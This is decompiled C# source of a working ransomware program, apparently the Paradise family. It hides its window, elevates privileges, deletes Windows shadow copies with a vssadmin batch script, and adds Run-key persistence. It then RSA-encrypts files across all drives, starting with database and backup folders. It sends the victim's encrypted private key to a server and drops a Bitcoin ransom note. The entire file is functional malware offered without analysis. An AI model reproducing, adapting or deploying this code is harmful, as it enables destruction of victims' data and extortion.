using System;
using System.Collections.Generic;
using System.Collections.Specialized;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Security.Principal;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.Win32;

namespace DP_MainForm
{
	// Token: 0x02000003 RID: 3
	public sealed class Program
	{
		// Token: 0x06000010 RID: 16 RVA: 0x000038F8 File Offset: 0x000028F8
		private static void AddEncryptedPC(string elapsed_time, string DecryptionInfo)
		{
			string address = Program.server + "/api/Encrypted.php";
			string str = Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory).Replace("\\", "/");
			using (WebClient webClient = new WebClient())
			{
				byte[] bytes = webClient.UploadValues(address, new NameValueCollection
				{
					{
						"v",
						Program.vector
					},
					{
						"fc",
						Program.FilesCount.ToString()
					},
					{
						"computer_name",
						Environment.MachineName
					},
					{
						"et",
						elapsed_time
					},
					{
						"decryption_info",
						DecryptionInfo
					},
					{
						"id",
						Program.PCID
					}
				});
				string @string = Encoding.UTF8.GetString(bytes);
				if (!@string.Contains("Well done."))
				{
					File.WriteAllText(str + "/DecryptionInfo.auth", DecryptionInfo);
				}
			}
		}

		// Token: 0x0600000C RID: 12 RVA: 0x00003700 File Offset: 0x00002700
		private static void DeleteShadows()
		{
			try
			{
				string text = "@set @x=0; /*";
				text += "\r\n@echo off";
				text += "\r\nver |>NUL find /v \"5.\" && if \"%~1\"==\"\" cscript.exe //nologo //e:jscript \"%~f0\"& exit /b";
				text += "\r\n\r\nvssadmin delete shadows /all";
				text += "\r\npause";
				text += "\r\nexit /B";
				text += "\r\n */new ActiveXObject('Shell.Application').ShellExecute (WScript.ScriptFullName,'Admin','','runas',1);";
				Directory.CreateDirectory("1");
				File.WriteAllText("1/123.bat", text);
				Process.Start(Directory.GetCurrentDirectory() + "\\1");
				Thread.Sleep(300);
				IntPtr foregroundWindow = Program.FindWindow(null, "cmd.exe");
				Program.SetForegroundWindow(foregroundWindow);
				SendKeys.SendWait("{DOWN}");
				SendKeys.SendWait("{ENTER}");
				Thread.Sleep(1500);
				SendKeys.SendWait("Y");
				Console.WriteLine("GOTOVO BLEAT");
				Thread.Sleep(30000);
				SendKeys.SendWait("{ENTER}");
				Thread.Sleep(100);
				File.Delete("1/123.bat");
				Directory.Delete("1");
			}
			catch (Exception)
			{
			}
		}

		// Token: 0x0600001E RID: 30 RVA: 0x000042E4 File Offset: 0x000032E4
		private static void DropDecriptionText(string dir)
		{
			try
			{
				File.WriteAllText(dir.Replace("\\", "/") + "/#DECRYPT MY FILES#.txt", Program.text);
			}
			catch (Exception)
			{
			}
		}

		// Token: 0x06000017 RID: 23 RVA: 0x00003CDC File Offset: 0x00002CDC
		private static void Encrypter(string file, RSACryptoServiceProvider ThRSA)
		{
			try
			{
				Program.EncryptFile(file, ThRSA);
			}
			catch (Exception)
			{
				Program.Encrypter(file, ThRSA);
			}
		}

		// Token: 0x0600001C RID: 28 RVA: 0x00004024 File Offset: 0x00003024
		private static void EncryptFile(string file, RSACryptoServiceProvider ThRSA)
		{
			try
			{
				FileInfo fileInfo = new FileInfo(file);
				if (fileInfo.Extension != ".paradise" && !fileInfo.FullName.Contains("#DECRYPT MY FILES#.txt") && fileInfo.Name != "id.dp")
				{
					List<byte[]> list = new List<byte[]>();
					List<byte> list2 = new List<byte>();
					if (fileInfo.Length / 1024L > 64L)
					{
						list = Program.GetPartOfFile(file, 547);
					}
					else
					{
						int blocks_count = Convert.ToInt32(fileInfo.Length / 117L);
						if (fileInfo.Length < 117L)
						{
							list.Add(File.ReadAllBytes(file));
							using (FileStream fileStream = File.OpenWrite(file))
							{
								fileStream.SetLength(0L);
								goto IL_C0;
							}
						}
						list = Program.GetPartOfFile(file, blocks_count);
					}
					IL_C0:
					if (list != null)
					{
						foreach (byte[] current in list)
						{
							byte[] collection = ThRSA.Encrypt(current, false);
							list2.AddRange(collection);
						}
						File.AppendAllText(file, "<CRYPTED>" + Convert.ToBase64String(list2.ToArray()) + "</CRYPTED>", Encoding.Default);
						File.Move(file, string.Concat(new string[]
						{
							file,
							"[id-",
							Program.PCID,
							"].[",
							Program.mail,
							"].paradise"
						}));
						File.Delete(file);
					}
				}
			}
			catch (Exception)
			{
			}
		}

		// Token: 0x0600001A RID: 26 RVA: 0x00003E4C File Offset: 0x00002E4C
		private static void EncryptFolder(string path)
		{
			RSACryptoServiceProvider rSACryptoServiceProvider = new RSACryptoServiceProvider();
			rSACryptoServiceProvider.FromXmlString(Program.RSA_Public);
			List<string> list = new List<string>();
			string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory);
			try
			{
				list.AddRange(Directory.GetFiles(path, "*.*", SearchOption.TopDirectoryOnly));
			}
			catch (Exception)
			{
			}
			foreach (string current in list)
			{
				Program.FilesCount++;
				Program.Encrypter(current, rSACryptoServiceProvider);
			}
			try
			{
				if (Program.SaveTextForUnlock)
				{
					Program.DropDecriptionText(path);
				}
				string[] array = Directory.GetDirectories(path);
				for (int i = 0; i < array.Length; i++)
				{
					string text = array[i];
					if (!(text == "C:\\Windows") && text != folderPath)
					{
						Program.EncryptFolder(text);
					}
				}
			}
			catch (Exception)
			{
			}
		}

		// Token: 0x0600000A RID: 10
		[DllImport("USER32.DLL", CharSet = CharSet.Unicode)]
		public static extern IntPtr FindWindow(string lpClassName, string lpWindowName);

		// Token: 0x0600001B RID: 27 RVA: 0x00003F48 File Offset: 0x00002F48
		private static void GetDesktopFiles(string path)
		{
			List<string> list = new List<string>();
			RSACryptoServiceProvider rSACryptoServiceProvider = new RSACryptoServiceProvider();
			rSACryptoServiceProvider.FromXmlString(Program.RSA_Public);
			try
			{
				try
				{
					list.AddRange(Directory.GetFiles(path, "*.*", SearchOption.TopDirectoryOnly));
				}
				catch (Exception)
				{
				}
				foreach (string current in list)
				{
					Program.Encrypter(current, rSACryptoServiceProvider);
				}
				if (Program.SaveTextForUnlock)
				{
					Program.DropDecriptionText(path);
				}
				string[] array = Directory.GetDirectories(path);
				for (int i = 0; i < array.Length; i++)
				{
					string text = array[i];
					Program.EncryptFolder(text);
					Program.directories.Add(text);
				}
			}
			catch (Exception)
			{
			}
		}

		// Token: 0x06000016 RID: 22 RVA: 0x00003C60 File Offset: 0x00002C60
		private static void GetDrives()
		{
			try
			{
				DriveInfo[] drives = DriveInfo.GetDrives();
				bool flag = false;
				DriveInfo[] array = drives;
				for (int i = 0; i < array.Length; i++)
				{
					DriveInfo driveInfo = array[i];
					if (driveInfo.Name.Contains("C:\\"))
					{
						flag = true;
					}
					else
					{
						Program.Drives.Enqueue(driveInfo.Name);
					}
				}
				if (flag)
				{
					Program.Drives.Enqueue("C:\\");
				}
			}
			catch (Exception)
			{
			}
		}

		// Token: 0x0600001D RID: 29 RVA: 0x000041FC File Offset: 0x000031FC
		private static List<byte[]> GetPartOfFile(string fileName, int blocks_count)
		{
			List<byte[]> result;
			try
			{
				int num = blocks_count * 117;
				List<byte[]> list = new List<byte[]>();
				byte[] array = new byte[num];
				using (FileStream fileStream = File.OpenRead(fileName))
				{
					fileStream.Seek((long)(-(long)num), SeekOrigin.End);
					fileStream.Read(array, 0, num);
				}
				using (FileStream fileStream2 = File.OpenWrite(fileName))
				{
					fileStream2.SetLength(fileStream2.Length - (long)num);
				}
				int num2 = 0;
				for (int i = 0; i < blocks_count; i++)
				{
					byte[] array2 = new byte[117];
					for (int j = 0; j < 117; j++)
					{
						array2[j] = array[num2];
						num2++;
					}
					list.Add(array2);
				}
				result = list;
			}
			catch (Exception)
			{
				result = null;
			}
			return result;
		}

		// Token: 0x0600000F RID: 15 RVA: 0x000038C8 File Offset: 0x000028C8
		private static void HandleConsoleSignal(Program.ConsoleSignal consoleSignal)
		{
			if (!File.Exists("DecryptionInfo.auth"))
			{
				Program.SetAutorunValue(true);
				Process.Start(Assembly.GetExecutingAssembly().Location + "arg");
			}
		}

		// Token: 0x06000014 RID: 20 RVA: 0x00003AAC File Offset: 0x00002AAC
		private static void Handler()
		{
			try
			{
				Program.PriorityEncryption();
				while (Program.Drives.Count != 0 && Program.Drives != null)
				{
					string text = Program.Drives.Dequeue();
					if (!string.IsNullOrEmpty(text))
					{
						Program.EncryptFolder(text);
					}
				}
				Program.GetDesktopFiles(Environment.GetFolderPath(Environment.SpecialFolder.Desktop));
			}
			catch (Exception)
			{
			}
		}

		// Token: 0x0600000D RID: 13 RVA: 0x0000381C File Offset: 0x0000281C
		public static string ID_Generator()
		{
			string text = "";
			Random random = new Random();
			while (text.Length < 8)
			{
				char c = (char)random.Next(33, 125);
				if (char.IsLetterOrDigit(c))
				{
					text += c;
				}
			}
			return text;
		}

		// Token: 0x06000011 RID: 17 RVA: 0x000039E8 File Offset: 0x000029E8
		public static bool IsAdmin()
		{
			WindowsIdentity current = WindowsIdentity.GetCurrent();
			WindowsPrincipal windowsPrincipal = new WindowsPrincipal(current);
			return windowsPrincipal.IsInRole(WindowsBuiltInRole.Administrator);
		}

		// Token: 0x06000009 RID: 9 RVA: 0x0000350C File Offset: 0x0000250C
		[STAThread]
		private static void Main(string[] args)
		{
			IntPtr consoleWindow = Program.NativeMethods.GetConsoleWindow();
			Program.NativeMethods.ShowWindow(consoleWindow, 0);
			Program.ConsoleHelper.SetSignalHandler(Program.signalHandler, true);
			Program.signalHandler = (Program.SignalHandler)Delegate.Combine(Program.signalHandler, new Program.SignalHandler(Program.HandleConsoleSignal));
			string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory);
			string[] files = Directory.GetFiles(folderPath, "*.paradise", SearchOption.TopDirectoryOnly);
			if (files.Length > 0)
			{
				Application.EnableVisualStyles();
				Application.SetCompatibleTextRenderingDefault(false);
				Application.Run(new Form1());
				return;
			}
			if (File.Exists(folderPath + "\\DecryptionInfo.auth"))
			{
				Environment.Exit(0);
			}
			if (args.Length == 0)
			{
				int num = Program.ProcessCount();
				if (!Program.IsAdmin())
				{
					Program.RunAsAdmin();
				}
				int num2 = Program.ProcessCount();
				if (num2 > num)
				{
					Environment.Exit(0);
				}
			}
			if (File.Exists("id.dp"))
			{
				Program.PCID = File.ReadAllText("id.dp");
			}
			else
			{
				Program.PCID = Program.ID_Generator();
				File.WriteAllText("id.dp", Program.PCID);
			}
			Program.text = Program.text + Environment.NewLine + "Your PC-ID:" + Program.PCID;
			Program.text = Program.text.Replace("<br>", "\r\n");
			Stopwatch stopwatch = new Stopwatch();
			stopwatch.Start();
			Program.DeleteShadows();
			Program.RSA_Public = Program.rsa.ToXmlString(false);
			Program.RSA_Private = Program.rsa.ToXmlString(true);
			Program.MasterRSA.FromXmlString(Program.RSA_MasterPublic);
			Program.rsa.FromXmlString(Program.RSA_Public);
			Program.GetDrives();
			Program.Handler();
			stopwatch.Stop();
			int num3 = stopwatch.Elapsed.Hours * 60 + stopwatch.Elapsed.Minutes;
			string time = num3 + ":" + stopwatch.Elapsed.Seconds;
			Program.SavePrivateKey(time);
			Application.EnableVisualStyles();
			Application.SetCompatibleTextRenderingDefault(false);
			Application.Run(new Form1());
		}

		// Token: 0x06000018 RID: 24 RVA: 0x00003D0C File Offset: 0x00002D0C
		private static void PriorityEncryption()
		{
			Program.EncryptFolder(Directory.GetCurrentDirectory());
			foreach (string current in Program.Drives)
			{
				Program.PrioritySearcher(current);
			}
		}

		// Token: 0x06000019 RID: 25 RVA: 0x00003D68 File Offset: 0x00002D68
		private static void PrioritySearcher(string path)
		{
			try
			{
				string[] array = new string[]
				{
					"mysql",
					"firebird",
					" mssql",
					"microsoft sql",
					"backup"
				};
				string[] array2 = array;
				for (int i = 0; i < array2.Length; i++)
				{
					string value = array2[i];
					if (Path.GetDirectoryName(path).Contains(value))
					{
						Program.EncryptFolder(path);
					}
				}
				string[] array3 = Directory.GetDirectories(path);
				for (int j = 0; j < array3.Length; j++)
				{
					string path2 = array3[j];
					string[] array4 = array;
					for (int k = 0; k < array4.Length; k++)
					{
						string value2 = array4[k];
						if (Path.GetDirectoryName(path2).Contains(value2))
						{
							Program.EncryptFolder(path2);
						}
					}
					Program.PrioritySearcher(path2);
				}
			}
			catch (Exception)
			{
			}
		}

		// Token: 0x06000012 RID: 18 RVA: 0x00003A10 File Offset: 0x00002A10
		public static int ProcessCount()
		{
			int num = 0;
			Process[] processes = Process.GetProcesses();
			Process[] array = processes;
			for (int i = 0; i < array.Length; i++)
			{
				Process process = array[i];
				if (process.ProcessName.ToLower().Contains("dp_main"))
				{
					num++;
				}
			}
			return num;
		}

		// Token: 0x06000013 RID: 19 RVA: 0x00003A5C File Offset: 0x00002A5C
		public static void RunAsAdmin()
		{
			ProcessStartInfo processStartInfo = new ProcessStartInfo();
			processStartInfo.Verb = "runas";
			processStartInfo.FileName = Directory.GetCurrentDirectory() + "\\DP_Main.exe";
			try
			{
				Process.Start(processStartInfo);
			}
			catch (Exception)
			{
			}
		}

		// Token: 0x06000015 RID: 21 RVA: 0x00003B14 File Offset: 0x00002B14
		private static void SavePrivateKey(string time)
		{
			string str = Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory).Replace("\\", "/");
			List<byte[]> list = new List<byte[]>();
			byte[] bytes = Encoding.Default.GetBytes(Program.RSA_Private);
			int num = Convert.ToInt32(Math.Ceiling((double)bytes.Length / 117.0));
			int num2 = 0;
			for (int i = 0; i < num; i++)
			{
				byte[] array = new byte[117];
				for (int j = 0; j < 117; j++)
				{
					if (bytes.Length > num2)
					{
						array[j] = bytes[num2];
						num2++;
					}
				}
				list.Add(array);
			}
			string text = "";
			foreach (byte[] current in list)
			{
				byte[] array2 = Program.MasterRSA.Encrypt(current, false);
				Console.WriteLine(array2.Length);
				text += Encoding.Default.GetString(array2);
			}
			text = Convert.ToBase64String(Encoding.Default.GetBytes(text));
			try
			{
				Program.AddEncryptedPC(time, text);
			}
			catch (Exception)
			{
				File.WriteAllText(str + "/DecryptionInfo.auth", text);
			}
		}

		// Token: 0x0600000E RID: 14 RVA: 0x00003864 File Offset: 0x00002864
		public static bool SetAutorunValue(bool autorun)
		{
			string location = Assembly.GetExecutingAssembly().Location;
			try
			{
				RegistryKey registryKey = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run\\");
				if (autorun)
				{
					registryKey.SetValue("svch", location);
				}
				else
				{
					registryKey.DeleteValue("svch");
				}
				registryKey.Close();
			}
			catch
			{
				return false;
			}
			return true;
		}

		// Token: 0x0600000B RID: 11
		[DllImport("USER32.DLL")]
		public static extern bool SetForegroundWindow(IntPtr hWnd);

		// Token: 0x0400002E RID: 46
		public static List<string> directories = new List<string>();

		// Token: 0x0400002F RID: 47
		private static Queue<string> Drives = new Queue<string>();

		// Token: 0x0400002A RID: 42
		private static int FilesCount = 0;

		// Token: 0x04000021 RID: 33
		private object locker = new object();

		// Token: 0x04000023 RID: 35
		private static string mail = "welcome@cock.li";

		// Token: 0x0400002C RID: 44
		public static RSACryptoServiceProvider MasterRSA = new RSACryptoServiceProvider();

		// Token: 0x0400001E RID: 30
		private const string name = "svch";

		// Token: 0x04000027 RID: 39
		private static string PCID = "";

		// Token: 0x0400002D RID: 45
		public static RSACryptoServiceProvider rsa = new RSACryptoServiceProvider();

		// Token: 0x04000026 RID: 38
		private static string RSA_MasterPublic = "<RSAKeyValue><Modulus>maTp68zA8ho6MOEQI9k7s75JZIPu5mNBMD8O04ssgvcVrtZNoqqLbe0cB6wc+yF+sLeyxuPdylh/0hBDKIJT4BheadiDqN0vyU2TlOYelVnkCt/SCOlz14BJsQBqdA4TCyztl7ClmUuhkdglBeXbyu28nxl+SbYdceBojtyRtzE=</Modulus><Exponent>AQAB</Exponent></RSAKeyValue>";

		// Token: 0x04000029 RID: 41
		private static string RSA_Private = "";

		// Token: 0x04000028 RID: 40
		private static string RSA_Public = "";

		// Token: 0x0400002B RID: 43
		private static bool SaveTextForUnlock = bool.Parse("True");

		// Token: 0x04000022 RID: 34
		private static string server = "localhost";

		// Token: 0x0400001F RID: 31
		private static Program.SignalHandler signalHandler;

		// Token: 0x04000025 RID: 37
		private static string text = "[WHAT HAPPENED]<br><br>Your important files produced on this computer have been encrypted due a security problem<br>If you want to restore them, write us to the e-mail: welcome@cock.li<br>You have to pay for decryption in Bitcoins. The price depends on how fast you write to us.<br>After payment we will send you the decryption tool that will decrypt all your files.<br><br>[FREE DECRYPTION AS GUARANTEE]<br><br>Before paying you can send to us up to 3 files for free decryption.<br>Please note that files must NOT contain valuable information<br>and their total size must be less than 1Mb<br>[HOW TO OBTAIN BITCOINS]<br>The easiest way to buy bitcoin is LocalBitcoins site.<br>You have to register, click Buy bitcoins and select the seller by payment method and price<br>https://localbitcoins.com/buy_bitcoins<br><br>[ATTENTION]<br><br>Do not rename encrypted files<br>Do not try to decrypt your data using third party software, it may cause permanent data loss<br>If you not write on e-mail in 36 hours - your key has been deleted and you cant decrypt your files";

		// Token: 0x04000020 RID: 32
		private static Thread[] Threads;

		// Token: 0x04000024 RID: 36
		private static string vector = "maTp68zA";

		// Token: 0x02000007 RID: 7
		internal static class ConsoleHelper
		{
			// Token: 0x06000027 RID: 39
			[DllImport("Kernel32", EntryPoint = "SetConsoleCtrlHandler")]
			public static extern bool SetSignalHandler(Program.SignalHandler handler, bool add);
		}

		// Token: 0x02000006 RID: 6
		internal enum ConsoleSignal
		{
			// Token: 0x04000033 RID: 51
			CtrlC,
			// Token: 0x04000034 RID: 52
			CtrlBreak,
			// Token: 0x04000035 RID: 53
			Close,
			// Token: 0x04000036 RID: 54
			LogOff = 5,
			// Token: 0x04000037 RID: 55
			Shutdown
		}

		// Token: 0x02000004 RID: 4
		private static class NativeMethods
		{
			// Token: 0x06000021 RID: 33
			[DllImport("kernel32.dll")]
			public static extern IntPtr GetConsoleWindow();

			// Token: 0x06000022 RID: 34
			[DllImport("user32.dll")]
			public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

			// Token: 0x04000030 RID: 48
			public const int SW_HIDE = 0;

			// Token: 0x04000031 RID: 49
			public const int SW_SHOW = 5;
		}

		// Token: 0x02000005 RID: 5
		// Token: 0x06000024 RID: 36
		internal delegate void SignalHandler(Program.ConsoleSignal consoleSignal);
	}
}
